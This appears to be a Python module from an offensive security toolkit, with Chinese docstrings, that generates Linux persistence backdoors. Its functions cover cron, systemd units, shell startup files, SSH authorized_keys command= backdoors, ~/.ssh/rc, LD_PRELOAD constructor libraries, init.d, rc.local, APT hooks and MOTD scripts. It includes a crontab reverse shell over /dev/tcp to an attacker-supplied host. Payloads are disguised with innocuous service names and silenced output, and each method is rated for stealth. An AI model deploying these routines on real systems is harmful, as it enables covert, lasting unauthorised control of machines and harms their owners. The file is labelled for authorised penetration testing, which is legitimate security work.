#!/usr/bin/env python3
"""
Linux 持久化模块 - Linux Persistence
功能: crontab、systemd、.bashrc、SSH authorized_keys、LD_PRELOAD
仅用于授权渗透测试
"""

import logging
import secrets
import string
from dataclasses import dataclass
from enum import Enum
from typing import Any, Dict, List

logger = logging.getLogger(__name__)


class LinuxPersistMethod(Enum):
    """Linux 持久化方法"""

    CRONTAB = "crontab"
    SYSTEMD_SERVICE = "systemd_service"
    SYSTEMD_TIMER = "systemd_timer"
    BASHRC = "bashrc"
    PROFILE = "profile"
    SSH_AUTHORIZED_KEYS = "ssh_authorized_keys"
    SSH_RC = "ssh_rc"
    LD_PRELOAD = "ld_preload"
    INIT_D = "init_d"
    RC_LOCAL = "rc_local"
    MOTD = "motd"
    APT_HOOK = "apt_hook"
    UDEV_RULE = "udev_rule"


@dataclass
class PersistenceResult:
    """持久化结果"""

    success: bool
    method: str
    location: str
    install_command: str = ""
    cleanup_command: str = ""
    content: str = ""
    error: str = ""


class LinuxPersistence:
    """
    Linux 持久化生成器

    Usage:
        persistence = LinuxPersistence()

        # Crontab 持久化
        result = persistence.crontab(
            command="/tmp/payload.sh",
            schedule="*/5 * * * *"
        )

        # Systemd 服务持久化
        result = persistence.systemd_service(
            name="system-health",
            exec_path="/opt/.hidden/payload"
        )
    """

    def __init__(self):
        self._random_suffix = "".join(secrets.choice(string.ascii_lowercase) for _ in range(4))

    def _generate_name(self, prefix: str = "sys") -> str:
        """生成随机名称"""
        return f"{prefix}-{self._random_suffix}"

    # ==================== Crontab ====================

    def crontab(
        self, command: str, schedule: str = "@reboot", user: str = "", hidden: bool = True
    ) -> PersistenceResult:
        """
        Crontab 持久化

        Args:
            command: 要执行的命令
            schedule: cron 表达式 (@reboot, */5 * * * *, 等)
            user: 用户 (空则当前用户)
            hidden: 是否隐藏输出
        """
        if hidden:
            command = f"{command} >/dev/null 2>&1"

        cron_entry = f"{schedule} {command}"

        if user:
            install_cmd = f'echo "{cron_entry}" | sudo crontab -u {user} -'
            cleanup_cmd = f"sudo crontab -u {user} -r"
        else:
            install_cmd = f'(crontab -l 2>/dev/null; echo "{cron_entry}") | crontab -'
            cleanup_cmd = f'crontab -l | grep -v "{command}" | crontab -'

        return PersistenceResult(
            success=True,
            method=LinuxPersistMethod.CRONTAB.value,
            location=f"/var/spool/cron/crontabs/{user or '$USER'}",
            install_command=install_cmd,
            cleanup_command=cleanup_cmd,
            content=cron_entry,
        )

    def crontab_reverse_shell(
        self, lhost: str, lport: int, schedule: str = "*/5 * * * *"
    ) -> PersistenceResult:
        """
        Crontab 反弹 Shell

        Args:
            lhost: 监听地址
            lport: 监听端口
            schedule: cron 表达式
        """
        # Bash 反弹 Shell
        reverse_cmd = f'/bin/bash -c "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"'
        return self.crontab(reverse_cmd, schedule, hidden=True)

    # ==================== Systemd ====================

    def systemd_service(
        self,
        exec_path: str,
        name: str = "",
        description: str = "System Health Monitor",
        restart: str = "always",
        user: str = "root",
    ) -> PersistenceResult:
        """
        Systemd 服务持久化

        Args:
            exec_path: 可执行文件路径
            name: 服务名称
            description: 服务描述
            restart: 重启策略 (always/on-failure/no)
            user: 运行用户
        """
        name = name or self._generate_name("svc")
        service_file = f"/etc/systemd/system/{name}.service"

        service_content = f"""[Unit]
Description={description}
After=network.target

[Service]
Type=simple
ExecStart={exec_path}
Restart={restart}
RestartSec=10
User={user}

[Install]
WantedBy=multi-user.target
"""

        install_cmd = f"""cat > {service_file} << 'EOF'
{service_content}
EOF
systemctl daemon-reload
systemctl enable {name}
systemctl start {name}"""

        cleanup_cmd = f"""systemctl stop {name}
systemctl disable {name}
rm -f {service_file}
systemctl daemon-reload"""

        return PersistenceResult(
            success=True,
            method=LinuxPersistMethod.SYSTEMD_SERVICE.value,
            location=service_file,
            install_command=install_cmd,
            cleanup_command=cleanup_cmd,
            content=service_content,
        )

    def systemd_timer(
        self, exec_path: str, name: str = "", on_boot_sec: int = 60, on_unit_active_sec: int = 300
    ) -> Dict[str, str]:
        """
        Systemd Timer 持久化 (更隐蔽)

        Args:
            exec_path: 可执行文件路径
            name: 服务名称
            on_boot_sec: 启动后延迟秒数
            on_unit_active_sec: 重复间隔秒数
        """
        name = name or self._generate_name("timer")

        service_content = f"""[Unit]
Description=System Maintenance Service

[Service]
Type=oneshot
ExecStart={exec_path}
"""

        timer_content = f"""[Unit]
Description=System Maintenance Timer

[Timer]
OnBootSec={on_boot_sec}
OnUnitActiveSec={on_unit_active_sec}

[Install]
WantedBy=timers.target
"""

        return {
            "service_file": f"/etc/systemd/system/{name}.service",
            "service_content": service_content,
            "timer_file": f"/etc/systemd/system/{name}.timer",
            "timer_content": timer_content,
            "install_command": f"systemctl daemon-reload && systemctl enable {name}.timer && systemctl start {name}.timer",
            "cleanup_command": f"systemctl stop {name}.timer && systemctl disable {name}.timer && rm -f /etc/systemd/system/{name}.service /etc/systemd/system/{name}.timer",
        }

    # ==================== Shell RC ====================

    def bashrc(self, command: str, user: str = "", hidden: bool = True) -> PersistenceResult:
        """
        .bashrc 持久化

        Args:
            command: 要执行的命令
            user: 用户
            hidden: 是否隐藏输出
        """
        if user:
            bashrc_path = f"/home/{user}/.bashrc"
        else:
            bashrc_path = "~/.bashrc"

        if hidden:
            entry = f"\n# System update check\n({command}) >/dev/null 2>&1 &\n"
        else:
            entry = f"\n{command}\n"

        install_cmd = f'echo "{entry}" >> {bashrc_path}'
        escaped_cmd = command.replace("/", r"\/")
        cleanup_cmd = f'sed -i "/{escaped_cmd}/d" {bashrc_path}'

        return PersistenceResult(
            success=True,
            method=LinuxPersistMethod.BASHRC.value,
            location=bashrc_path,
            install_command=install_cmd,
            cleanup_command=cleanup_cmd,
            content=entry,
        )

    def profile(self, command: str, hidden: bool = True) -> PersistenceResult:
        """
        /etc/profile 持久化 (所有用户)
        """
        profile_path = "/etc/profile"

        if hidden:
            entry = f"\n# System initialization\n({command}) >/dev/null 2>&1 &\n"
        else:
            entry = f"\n{command}\n"

        return PersistenceResult(
            success=True,
            method=LinuxPersistMethod.PROFILE.value,
            location=profile_path,
            install_command=f'echo "{entry}" >> {profile_path}',
            cleanup_command='sed -i "/{}/d" {}'.format(command.replace("/", r"\/"), profile_path),
            content=entry,
        )

    # ==================== SSH ====================

    def ssh_authorized_keys(
        self, public_key: str, user: str = "root", options: str = ""
    ) -> PersistenceResult:
        """
        SSH authorized_keys 持久化

        Args:
            public_key: SSH 公钥
            user: 用户
            options: SSH 选项 (如 command="...", no-pty 等)
        """
        if user == "root":
            auth_keys_path = "/root/.ssh/authorized_keys"
        else:
            auth_keys_path = f"/home/{user}/.ssh/authorized_keys"

        if options:
            entry = f"{options} {public_key}"
        else:
            entry = public_key

        install_cmd = f"""mkdir -p $(dirname {auth_keys_path})
chmod 700 $(dirname {auth_keys_path})
echo "{entry}" >> {auth_keys_path}
chmod 600 {auth_keys_path}"""

        return PersistenceResult(
            success=True,
            method=LinuxPersistMethod.SSH_AUTHORIZED_KEYS.value,
            location=auth_keys_path,
            install_command=install_cmd,
            cleanup_command='sed -i "/{}/d" {}'.format(
                public_key[:30].replace("/", r"\/"), auth_keys_path
            ),
            content=entry,
        )

    def ssh_authorized_keys_backdoor(
        self, public_key: str, backdoor_command: str, user: str = "root"
    ) -> PersistenceResult:
        """
        SSH authorized_keys 后门 (登录时执行命令)

        Args:
            public_key: SSH 公钥
            backdoor_command: 登录时执行的命令
            user: 用户
        """
        # 使用 command= 选项在 SSH 登录时执行命令
        options = f'command="{backdoor_command}",no-agent-forwarding,no-X11-forwarding'
        return self.ssh_authorized_keys(public_key, user, options)

    def ssh_rc(self, command: str, user: str = "") -> PersistenceResult:
        """
        ~/.ssh/rc 持久化 (SSH 登录时执行)
        """
        if user:
            rc_path = f"/home/{user}/.ssh/rc"
        else:
            rc_path = "~/.ssh/rc"

        content = f"""#!/bin/bash
{command} &
"""

        install_cmd = f"""cat > {rc_path} << 'EOF'
{content}
EOF
chmod 700 {rc_path}"""

        return PersistenceResult(
            success=True,
            method=LinuxPersistMethod.SSH_RC.value,
            location=rc_path,
            install_command=install_cmd,
            cleanup_command=f"rm -f {rc_path}",
            content=content,
        )

    # ==================== LD_PRELOAD ====================

    def ld_preload(self, so_path: str, global_config: bool = True) -> PersistenceResult:
        """
        LD_PRELOAD 持久化 (共享库劫持)

        Args:
            so_path: 恶意 .so 文件路径
            global_config: 是否写入全局配置
        """
        if global_config:
            location = "/etc/ld.so.preload"
            install_cmd = f'echo "{so_path}" >> {location}'
            escaped_so = so_path.replace("/", r"\/")
            cleanup_cmd = f'sed -i "/{escaped_so}/d" {location}'
        else:
            location = "/etc/environment"
            install_cmd = f'echo "LD_PRELOAD={so_path}" >> {location}'
            cleanup_cmd = f'sed -i "/LD_PRELOAD/d" {location}'

        return PersistenceResult(
            success=True,
            method=LinuxPersistMethod.LD_PRELOAD.value,
            location=location,
            install_command=install_cmd,
            cleanup_command=cleanup_cmd,
        )

    def generate_preload_so(self, command: str) -> str:
        """
        生成 LD_PRELOAD 劫持 .so 源码

        Args:
            command: 要执行的命令
        """
        c_code = f"""#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void preload_init(void) {{
    unsetenv("LD_PRELOAD");
    if (fork() == 0) {{
        setsid();
        system("{command}");
        exit(0);
    }}
}}
"""
        return c_code

    # ==================== Init Scripts ====================

    def init_d(self, exec_path: str, name: str = "") -> PersistenceResult:
        """
        /etc/init.d/ 持久化 (SysV init)
        """
        name = name or self._generate_name("init")
        init_path = f"/etc/init.d/{name}"

        script_content = f"""#!/bin/bash
### BEGIN INIT INFO
# Provides:          {name}
# Required-Start:    $local_fs $network
# Required-Stop:     $local_fs
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: System service
### END INIT INFO

case "$1" in
    start)
        {exec_path} &
        ;;
    stop)
        pkill -f {exec_path}
        ;;
    *)
        echo "Usage: $0 {{start|stop}}"
        exit 1
        ;;
esac
exit 0
"""

        install_cmd = f"""cat > {init_path} << 'INITEOF'
{script_content}
INITEOF
chmod +x {init_path}
update-rc.d {name} defaults"""

        return PersistenceResult(
            success=True,
            method=LinuxPersistMethod.INIT_D.value,
            location=init_path,
            install_command=install_cmd,
            cleanup_command=f"update-rc.d -f {name} remove && rm -f {init_path}",
            content=script_content,
        )

    def rc_local(self, command: str) -> PersistenceResult:
        """
        /etc/rc.local 持久化
        """
        rc_local_path = "/etc/rc.local"

        install_cmd = f"""if [ ! -f {rc_local_path} ]; then
    echo '#!/bin/bash' > {rc_local_path}
    chmod +x {rc_local_path}
fi
sed -i '/^exit 0/d' {rc_local_path}
echo '{command}' >> {rc_local_path}
echo 'exit 0' >> {rc_local_path}"""

        return PersistenceResult(
            success=True,
            method=LinuxPersistMethod.RC_LOCAL.value,
            location=rc_local_path,
            install_command=install_cmd,
            cleanup_command='sed -i "/{}/d" {}'.format(command.replace("/", r"\/"), rc_local_path),
        )

    # ==================== APT Hook ====================

    def apt_hook(self, command: str, name: str = "") -> PersistenceResult:
        """
        APT Hook 持久化 (apt 操作时执行)
        """
        name = name or self._generate_name("apt")
        hook_path = f"/etc/apt/apt.conf.d/99{name}"

        content = f'APT::Update::Pre-Invoke {{"{command}";}};'

        return PersistenceResult(
            success=True,
            method=LinuxPersistMethod.APT_HOOK.value,
            location=hook_path,
            install_command=f"echo '{content}' > {hook_path}",
            cleanup_command=f"rm -f {hook_path}",
            content=content,
        )

    # ==================== MOTD ====================

    def motd(self, command: str) -> PersistenceResult:
        """
        MOTD 持久化 (用户登录时显示消息)
        """
        motd_path = "/etc/update-motd.d/99-backdoor"

        content = f"""#!/bin/bash
{command} >/dev/null 2>&1 &
"""

        return PersistenceResult(
            success=True,
            method=LinuxPersistMethod.MOTD.value,
            location=motd_path,
            install_command=f"""cat > {motd_path} << 'EOF'
{content}
EOF
chmod +x {motd_path}""",
            cleanup_command=f"rm -f {motd_path}",
            content=content,
        )

    # ==================== 综合方法 ====================

    def get_all_methods(self, command: str) -> List[Dict[str, Any]]:
        """
        获取所有持久化方法
        """
        methods = []

        # Crontab
        result = self.crontab(command)
        methods.append(
            {
                "method": result.method,
                "location": result.location,
                "install": result.install_command,
                "cleanup": result.cleanup_command,
                "requires_root": False,
                "stealth": "medium",
            }
        )

        # Systemd
        result = self.systemd_service(command)
        methods.append(
            {
                "method": result.method,
                "location": result.location,
                "install": result.install_command,
                "cleanup": result.cleanup_command,
                "requires_root": True,
                "stealth": "low",
            }
        )

        # Bashrc
        result = self.bashrc(command)
        methods.append(
            {
                "method": result.method,
                "location": result.location,
                "install": result.install_command,
                "cleanup": result.cleanup_command,
                "requires_root": False,
                "stealth": "low",
            }
        )

        # RC Local
        result = self.rc_local(command)
        methods.append(
            {
                "method": result.method,
                "location": result.location,
                "install": result.install_command,
                "cleanup": result.cleanup_command,
                "requires_root": True,
                "stealth": "medium",
            }
        )

        return methods


# 便捷函数
def linux_persist(command: str, method: str = "crontab", **kwargs) -> Dict[str, Any]:
    """
    Linux 持久化便捷函数

    Args:
        command: 要执行的命令或路径
        method: 持久化方法
        **kwargs: 其他参数
    """
    persistence = LinuxPersistence()

    method_map = {
        "crontab": persistence.crontab,
        "systemd": persistence.systemd_service,
        "bashrc": persistence.bashrc,
        "profile": persistence.profile,
        "ssh_keys": persistence.ssh_authorized_keys,
        "ssh_rc": persistence.ssh_rc,
        "ld_preload": persistence.ld_preload,
        "init_d": persistence.init_d,
        "rc_local": persistence.rc_local,
        "apt_hook": persistence.apt_hook,
        "motd": persistence.motd,
    }

    if method == "systemd_timer":
        result = persistence.systemd_timer(command, **kwargs)
        return {"success": True, "method": method, **result}

    if method in method_map:
        result = method_map[method](command, **kwargs)
        return {
            "success": result.success,
            "method": result.method,
            "location": result.location,
            "install_command": result.install_command,
            "cleanup_command": result.cleanup_command,
            "content": result.content,
            "error": result.error,
        }

    return {"success": False, "error": f"Unknown method: {method}"}


def list_linux_persistence_methods() -> List[Dict[str, str]]:
    """列出所有可用的 Linux 持久化方法"""
    return [
        {
            "method": "crontab",
            "description": "Crontab 定时任务",
            "root_required": False,
            "stealth": "medium",
        },
        {
            "method": "systemd",
            "description": "Systemd 服务",
            "root_required": True,
            "stealth": "low",
        },
        {
            "method": "systemd_timer",
            "description": "Systemd 定时器",
            "root_required": True,
            "stealth": "medium",
        },
        {
            "method": "bashrc",
            "description": ".bashrc 启动脚本",
            "root_required": False,
            "stealth": "low",
        },
        {
            "method": "profile",
            "description": "/etc/profile 全局脚本",
            "root_required": True,
            "stealth": "medium",
        },
        {
            "method": "ssh_keys",
            "description": "SSH authorized_keys",
            "root_required": False,
            "stealth": "high",
        },
        {
            "method": "ssh_rc",
            "description": "SSH RC 脚本",
            "root_required": False,
            "stealth": "high",
        },
        {
            "method": "ld_preload",
            "description": "LD_PRELOAD 劫持",
            "root_required": True,
            "stealth": "high",
        },
        {
            "method": "init_d",
            "description": "/etc/init.d 脚本",
            "root_required": True,
            "stealth": "low",
        },
        {
            "method": "rc_local",
            "description": "/etc/rc.local",
            "root_required": True,
            "stealth": "medium",
        },
        {"method": "apt_hook", "description": "APT Hook", "root_required": True, "stealth": "high"},
        {"method": "motd", "description": "MOTD 脚本", "root_required": True, "stealth": "medium"},
    ]


if __name__ == "__main__":
    # 配置测试用日志
    logging.basicConfig(level=logging.INFO, format="%(levelname)s: %(message)s")

    logger.info("Linux Persistence Module")
    logger.info("=" * 50)
    logger.info("Available methods:")
    for m in list_linux_persistence_methods():
        root = "[Root]" if m["root_required"] else "[User]"
        logger.info(f"  {root} {m['method']}: {m['description']} (stealth: {m['stealth']})")
